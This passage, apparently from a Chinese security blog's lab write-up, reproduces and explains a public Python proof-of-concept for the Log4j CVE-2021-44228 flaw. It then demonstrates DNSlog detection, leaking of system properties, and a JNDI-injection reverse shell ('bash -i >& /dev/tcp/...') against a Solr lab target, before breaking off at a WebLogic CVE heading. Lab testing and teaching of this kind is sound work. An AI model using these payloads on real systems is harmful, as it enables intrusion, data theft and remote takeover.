class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure>

<h3 id="信息泄露脚本分析"><a href="#信息泄露脚本分析" class="headerlink" title="信息泄露脚本分析"></a>信息泄露脚本分析</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>
<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>
<p>的数据，并发送响应数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>
<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>
<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>
<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure>



<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>
<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>



<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>
<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>



<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>
<p>那么当程序退出时，它也会被中断。</p>
<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure>



<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>
<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>
<p>并打印服务器的响应状态码，以及响应的文本内容</p>
<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure>

<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure>

<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="利用DNSlog验证漏洞"><a href="#利用DNSlog验证漏洞" class="headerlink" title="利用DNSlog验证漏洞"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>
<p>先<code>Get SubDomain</code>获取一个子域名</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145121926.png"><img src="/CVE-Test/image-20221220145121926.png" alt="image-20221220145121926"></a></p>
<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145505204.png"><img src="/CVE-Test/image-20221220145505204.png" alt="image-20221220145505204"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>

<p>其中<code>action</code>参数可控，有很大可能是注入点</p>
<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="number">4</span>d5do5.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p>访问查看</p>
<p><code>DNSlog</code>收到了访问请求</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145131607.png"><img src="/CVE-Test/image-20221220145131607.png" alt="image-20221220145131607"></a></p>
<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145054026.png"><img src="/CVE-Test/image-20221220145054026.png" alt="image-20221220145054026"></a></p>
<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>
<p>故此推断<code>log4j2</code>漏洞存在</p>
<h3 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>
<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>
<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>
<p>当然直接通过访问得到消息也是可以的</p>
<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="variable">$&#123;sys:os.version&#125;</span>.<span class="number">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220220840849.png"><img src="/CVE-Test/image-20221220220840849.png" alt="image-20221220220840849"></a></p>
<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="variable">$&#123;sys:user.name&#125;</span>.<span class="number">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>



<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220175405653.png"><img src="/CVE-Test/image-20221220175405653.png" alt="image-20221220175405653"></a></p>
<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220170944260.png"><img src="/CVE-Test/image-20221220170944260.png" alt="image-20221220170944260"></a></p>
<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">攻击机kali 监听端口:<span class="number">8888</span></span><br><span class="line">靶机ubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure>

<h4 id="JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>
<p>先启动工具</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221163132059.png"><img src="/CVE-Test/image-20221221163132059.png" alt="image-20221221163132059"></a></p>
<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>
<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>
<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>
<p>只需要构造<code>payload</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -<span class="selector-tag">i</span> &gt;&amp; /dev/tcp/xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx/xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*这里的</span><br><span class="line">/xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx/xxxx</span><br><span class="line">就是其后跟上的参数</span><br><span class="line">/<span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>
<p>然后在攻击机监听<code>6666</code>端口</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221203418508.png"><img src="/CVE-Test/image-20221221203418508.png" alt="image-20221221203418508"></a></p>
<p>最后访问<code>payload</code>，触发</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221203458628.png"><img src="/CVE-Test/image-20221221203458628.png" alt="image-20221221203458628"></a></p>
<p>成功反弹到<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221203538282.png"><img src="/CVE-Test/image-20221221203538282.png" alt="image-20221221203538282"></a></p>
<p>测试完毕</p>
<h1 id="CVE-2023-21839-Weblogic远程代码执行漏洞"><a href="#CVE-2023-21839-Weblogic远程代码执行漏洞" class="headerlink" title="CVE-2023-21839 Weblogic远程代码执行漏洞"></a>CVE-2023-21839 Weblogic远程代码执行漏洞</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code></p>
<p>先在官方的进行修复更新文档中进行查看</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.oracle.com/security-alerts/cpujan2023.html">Oracle Critical Patch Update Advisory - January 2023</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226154457424.png"><img src="/CVE-Test/image-20230226154457424.png" alt="image-20230226154457424"></a></p>
<table>
<thead>
<tr>
<th align="left">CVE-2023-21839</th>
<th>Oracle WebLogic Server</th>
<th>核心</th>
<th>T3， IIOP</th>
<th>是的</th>
<th>7.5</th>
<th>网络</th>
<th>低</th>
<th>没有</th>
<th>没有</th>
<th>未 更改</th>
<th>高</th>
<th>没有</th>
<th>没有</th>
